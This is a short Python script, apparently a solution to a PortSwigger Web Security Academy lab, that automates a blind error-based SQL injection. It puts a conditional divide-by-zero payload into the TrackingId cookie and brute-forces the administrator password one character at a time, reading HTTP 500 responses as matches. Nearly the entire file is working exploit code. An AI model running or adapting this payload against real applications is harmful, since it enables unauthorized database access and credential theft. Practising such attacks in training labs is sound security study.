from pwn import *
from termcolor import colored
import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo... \n",'red'))
    p1.failure("Ataque de fuerza fruta detenido")
    sys.exit(1)

# CTRL+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")

def makeSQLI():
    
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
                'TrackingId': f"pnxfzFgMoWgRDsGx'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
                'session': "RW7IbhzCiEavNtR1kpElNbqFuXXqFkaQ"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0a840005033ce87380ac171800c30003.web-security-academy.net", cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()
